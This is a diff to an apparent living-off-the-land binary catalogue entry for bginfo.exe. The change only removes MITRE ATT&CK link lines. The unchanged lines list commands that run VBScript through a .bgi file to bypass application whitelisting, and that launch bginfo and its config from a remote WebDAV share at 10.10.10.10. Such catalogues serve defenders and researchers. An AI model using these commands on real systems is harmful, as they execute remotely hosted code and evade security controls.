@@ -10,7 +10,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
   - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
     Description: Execute VBscript code that is referenced within the bginfo.bgi file.
@@ -18,7 +17,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
   - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
@@ -26,7 +24,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
   - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
@@ -34,7 +31,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
   - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
@@ -42,7 +38,6 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
   - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
     Usecase: Remote execution of VBScript
@@ -50,7 +45,6 @@ Commands:
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows
 Full_Path:
   - Path: No fixed path
